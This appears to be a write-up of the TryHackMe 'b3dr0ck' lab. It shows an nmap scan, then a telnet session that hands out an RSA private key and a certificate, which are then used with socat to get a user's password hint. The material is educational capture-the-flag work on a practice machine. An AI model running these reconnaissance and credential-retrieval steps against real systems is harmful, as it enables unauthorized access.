<code>
https://tryhackme.com/r/room/b3dr0ck

## Service Enumeration

┌──(duke㉿kali)-[~]
└─$ nmap -sV  -p- -Pn  10.10.117.163
Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-10 02:55 CDT
Stats: 0:01:51 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 02:57 (0:00:22 remaining)
Nmap scan report for 10.10.117.163
Host is up (0.034s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main?
9009/tcp  open  pichat?
54321/tcp open  ssl/unknown
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4040-TCP:V=7.92%T=SSL%I=7%D=6/10%Time=6666B1AA%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nDate:\x20Mon,\x2010\x20Jun\x202024\x2007:56:26\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x
SF:20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2035em;\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x20sans-serif;
SF:\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x20\x20</head>\
SF:n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20ABC!</h1>\n\x20
SF:\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n\n\x20\x20\x2
SF:0\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x20a\x20website
SF:!\x20Can\x20you\x20believe\x20this\x20technology\x20exists\x20in\x20bed
SF:rock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helping\x20to\x20se
SF:tup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info\x20was\x20im
SF:portant\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\x20only\x20fi
SF:gured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll\x20is\x20a\x
SF:20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a\x20sql\x20da
SF:tabase,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLooks\x20like\x
SF:20it\x20started\x20something\x20else,\x20but\x20I'm\x20not\x20sure\x20h
SF:ow\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x20was\x20from\
SF:x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20try\x20and\x2
SF:0secure\x20")%r(HTTPOptions,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type
SF::\x20text/html\r\nDate:\x20Mon,\x2010\x20Jun\x202024\x2007:56:26\x20GMT
SF:\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<he
SF:ad>\n\x20\x20\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\
SF:x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2
SF:035em;\n\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x
SF:20sans-serif;\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x2
SF:0\x20</head>\n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20AB
SF:C!</h1>\n\x20\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n
SF:\n\x20\x20\x20\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x2
SF:0a\x20website!\x20Can\x20you\x20believe\x20this\x20technology\x20exists
SF:\x20in\x20bedrock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helpin
SF:g\x20to\x20setup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info
SF:\x20was\x20important\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\
SF:x20only\x20figured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll
SF:\x20is\x20a\x20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a
SF:\x20sql\x20database,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLo
SF:oks\x20like\x20it\x20started\x20something\x20else,\x20but\x20I'm\x20not
SF:\x20sure\x20how\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x2
SF:0was\x20from\x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20
SF:try\x20and\x20secure\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9009-TCP:V=7.92%I=7%D=6/10%Time=6666B199%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port54321-TCP:V=7.92%T=SSL%I=7%D=6/10%Time=6666B19F%P=x86_64-pc-linux-g
SF:nu%r(NULL,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x
SF:20access\.\n")%r(GenericLines,31,"Error:\x20'undefined'\x20is\x20not\x2
SF:0authorized\x20for\x20access\.\n")%r(GetRequest,31,"Error:\x20'undefine
SF:d'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(HTTPOptions,31,"
SF:Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")
SF:%r(RTSPRequest,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20
SF:for\x20access\.\n")%r(RPCCheck,31,"Error:\x20'undefined'\x20is\x20not\x
SF:20authorized\x20for\x20access\.\n")%r(DNSVersionBindReqTCP,31,"Error:\x
SF:20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(DNSSt
SF:atusRequestTCP,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20
SF:for\x20access\.\n")%r(Help,31,"Error:\x20'undefined'\x20is\x20not\x20au
SF:thorized\x20for\x20access\.\n")%r(SSLSessionReq,31,"Error:\x20'undefine
SF:d'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(TerminalServerCo
SF:okie,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20acc
SF:ess\.\n")%r(TLSSessionReq,31,"Error:\x20'undefined'\x20is\x20not\x20aut
SF:horized\x20for\x20access\.\n")%r(Kerberos,31,"Error:\x20'undefined'\x20
SF:is\x20not\x20authorized\x20for\x20access\.\n")%r(SMBProgNeg,31,"Error:\
SF:x20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(X11P
SF:robe,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20acc
SF:ess\.\n")%r(FourOhFourRequest,31,"Error:\x20'undefined'\x20is\x20not\x2
SF:0authorized\x20for\x20access\.\n")%r(LPDString,31,"Error:\x20'undefined
SF:'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(LDAPSearchReq,31,
SF:"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n"
SF:)%r(LDAPBindReq,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x2
SF:0for\x20access\.\n")%r(SIPOptions,31,"Error:\x20'undefined'\x20is\x20no
SF:t\x20authorized\x20for\x20access\.\n")%r(LANDesk-RC,31,"Error:\x20'unde
SF:fined'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(TerminalServ
SF:er,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20acces
SF:s\.\n")%r(NCP,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20f
SF:or\x20access\.\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 180.61 seconds



### Get priv Key and Cert

┌──(duke㉿kali)-[~]
└─$ telnet 10.10.117.163 9009                  
Trying 10.10.117.163...
Connected to 10.10.117.163.
Escape character is '^]'.


 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAysqJYzt457L9u8RkHFhe8P0uyThLWQBl+1ga8I+GKxfoIKEy
X8vZnJHSMFBWkWQoxUzmGEXa1V4/QHK0P/3KrHcntAQdlGOt0wrV6gRV1Yn5MpNQ
yzVGbMA7Qo1xbD8gPUnNd4yTk/Vicl5xzqE6MS74cqKS+vOKjFQOcuIKonJsq5k7
Jee2rYMHkOCKEplPTVCXPMRF9p/UkeImjgiOkOD0m+W4p33hAp3xsDpTIdArVk7a
XzkPtslvtAkHdMo9UyZdQSUZ6BAoXWx0YsTxYz7scIYca/gm5ve63srL/1nlCOLn
vSChXHU4Y+Bpe3VGS7/hV/kINkg4R6M1zQxcrwIDAQABAoIBACyw5AQ9eBC/7pEx
38orY4kCkwv/XwOXReJVcWJwjuXyV9LRE5PvDd8md8bz/Y//HckVgGP7CRYath/S
54xutvq5K8PNYGNycD1hVvFC0VPFG2kc9CJEdGfFGYo6N7PeWZGIMULWdTOXUYHY
9IXQHE34hwJkd7XcdD0mzSReUm+oGX1xmEE+VetflMC3tvWpwpoxl+mPnGjJcbUg
rAq2mYvT1JR3nqQqgE4hKKMRtVWnH6Bnr53v7ux8jDEkc+2ISSI4T2s746fh1p0G
s4ag3VId1/ntCzIfIiFELg5x6U5AghuMb/CcxbCGS0v052q7nxzoLtAGz5I7vNHN
V/ye40ECgYEA6NR5Yd5fYo0BGv4PWfNQWeEUsLJbsNboQoosk6c2STWyCqebYVX/
p85OehTual/DQ9SkZvu4p9kZVyN88wKb8pBrqTiCrn6hv49mvhEAd/6vWdpXmhs4
2BXTsLfU1iG1gerVFM5qeepMb3zr1zPQ3yJljeNd0XbZ11+b5ctC8s8CgYEA3vjM
1LWTXknZyLFv+Q/noHfpQ/KoJPQ5DzXpRjMLaUbhsnzo9XaWsXBD7ras3+y0vGh0
nrcC5gYlNbEqzf1w8YHQI5WTtbx2pIWufwMUd6NtjpW8+q6TqjL+gquLEPbVGz38
CYq2ieb3Y4eA5HVsv+sP/jH8OqV+hmKFqLPn8CECgYAg0cKCbywW4jVjrqhPT6Ll
6HpYJewS01hN+NgrwAhA7Za5NcMLR2oQJ16citLIn9MQfqrl8VmoH0wZImF8h8Of
v4fNhK+3FRaLwBUFebQNNhNVoRd0G545p2n9oQwZWwsQ0x9SHX6YzNQVaxB7d0xc
B6c1BvW0jwJJ/6okDDDVtQKBgGQ7qjCw02eegUWD5lcrPC/Z18XQzp+WHhRlYtFI
3wdbctg+6KZ3wfRQCGnGOt6K1RChUFOM58Op3Y5Ob3ScSup2Na/ZbMZUy2zYH4I/
SzMhB34CeCqk0gK/28O4A9MDcvdFHQjZD4fciTd30Yxh8RoxPEZECCQBA2i732Pg
RBKhAoGAbS6xznD8K7p7/nOgXTsUr9+RX6tf7L75p+rItW7lUXtcvUylgetbHsYQ
3O4kIe+zhmUpvphuHT/QxBho6sd46MglKMJu3ewLKEo9O7AUeTTBmcFa/9DooCGr
eynC5B9PBdSeQmG5R2X2CJv8NYsSmPwWzB4IVOvZoGo7gbOUSq0=
-----END RSA PRIVATE KEY-----


What are you looking for? password
Sorry, unrecognized request: 'password'

You use this service to recover your client certificate and private key
What are you looking for? certificate
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNDA2MTAwNzEwMjdaFw0yNTA2MTAwNzEwMjdaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDKyolj
O3jnsv27xGQcWF7w/S7JOEtZAGX7WBrwj4YrF+ggoTJfy9mckdIwUFaRZCjFTOYY
RdrVXj9AcrQ//cqsdye0BB2UY63TCtXqBFXVifkyk1DLNUZswDtCjXFsPyA9Sc13
jJOT9WJyXnHOoToxLvhyopL684qMVA5y4gqicmyrmTsl57atgweQ4IoSmU9NUJc8
xEX2n9SR4iaOCI6Q4PSb5binfeECnfGwOlMh0CtWTtpfOQ+2yW+0CQd0yj1TJl1B
JRnoEChdbHRixPFjPuxwhhxr+Cbm97reysv/WeUI4ue9IKFcdThj4Gl7dUZLv+FX
+Qg2SDhHozXNDFyvAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAKY65qYNuP9Yi/4q
73p0MbfafCL+ifLDRNKobCi4hfN/a2XygAcL7hwFrdyqxz0YZqig4bwqNLpigARZ
XA4nCCt27+cwPIFf2y7ayPeV3975YpduriV1PPqjgPTzGwilQDT9lNWxn4BPUEYF
SPpu688OAdF0ek/Y8+3UJx2OHMquY1XqF5DpBXp52nCd3TZt1hMyD+z2JbZlM54w
1PCNuyC2PHOSzJIr2uKUgaKEagpZEVCQPGAO/YONcyyA6TolUwBNAcF0hg4A7jM0
ARRB1p6jK+zfs9V3pautyQ7miSTbkUosOHHXgpL5fKfIsSQd699mb9VXnQlsF6MY
q2tv3N0=
-----END CERTIFICATE-----


### Get Barney Password

┌──(duke㉿kali)-[~/Documents/THM_B3dr0ck]
└─$ socat stdio ssl:10.10.117.163:54321,cert=www.crt,key=priv.id,verify=0


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Barney Rubble' is authorized.
b3dr0ck> password
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')

</code>
